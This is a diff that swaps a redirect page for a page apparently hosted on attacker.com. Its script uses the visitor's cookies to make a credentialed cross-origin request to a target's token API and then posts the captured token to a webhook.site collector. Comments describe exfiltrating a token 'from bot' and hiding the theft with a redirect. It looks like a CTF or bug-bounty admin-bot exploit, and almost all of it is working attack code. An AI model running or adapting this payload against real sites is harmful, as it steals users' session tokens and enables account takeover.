@@ -1,15 +1,67 @@
-<!doctype html>
-<html lang="en">
+<!-- index.html on https://attacker.com -->
+<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="utf-8">
-    <!-- This meta tag causes the redirect -->
-    <meta http-equiv="refresh" content="0; url=http://localhost/admin">
-    <title>Redirecting...</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <p>
-        If you are not redirected automatically,
-        <a href="http://localhost/admin">click here</a>.
-    </p>
+    <h1>Please wait...</h1>
+    <script>
+        (async function() {
+            // Your Webhook Collector URL from webhook.site or a similar service
+            const WEBHOOK_COLLECTOR_URL = 'https://webhook.site/bfa1a9b1-a5d4-4a57-89b5-edc3b4e3a89e';
+            
+            // The URL of the target endpoint on the vulnerable application
+            const TARGET_API_URL = 'https://vulnerable-app.com/api/get-token';
+
+            try {
+                // --- Step 1: Fetch the token from the target API ---
+                // The 'credentials: "include"' option is CRITICAL.
+                // It tells the browser to automatically include cookies (like the
+                // next-auth session cookie) in this cross-origin request.
+                const response = await fetch(TARGET_API_URL, {
+                    method: 'GET',
+                    credentials: 'include' 
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Target API responded with status: ${response.status}`);
+                }
+
+                // The endpoint returns the token payload as JSON
+                const tokenData = await response.json();
+
+                // --- Step 2: Exfiltrate (send) the captured token data to your collector ---
+                await fetch(WEBHOOK_COLLECTOR_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    // We wrap the captured data in another object for clarity
+                    body: JSON.stringify({
+                        message: "Successfully exfiltrated token from bot",
+                        capturedToken: tokenData,
+                        origin: window.location.href
+                    })
+                });
+
+                // Optional: For stealth, you could redirect the bot somewhere else
+                // window.location.href = "https://google.com";
+
+            } catch (error) {
+                // If something goes wrong (like a CORS error), send the error message
+                // to your collector so you can debug what happened.
+                await fetch(WEBHOOK_COLLECTOR_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        message: "Failed to exfiltrate token",
+                        error: error.message,
+                        origin: window.location.href
+                    })
+                });
+            }
+        })();
+    </script>
 </body>
 </html>
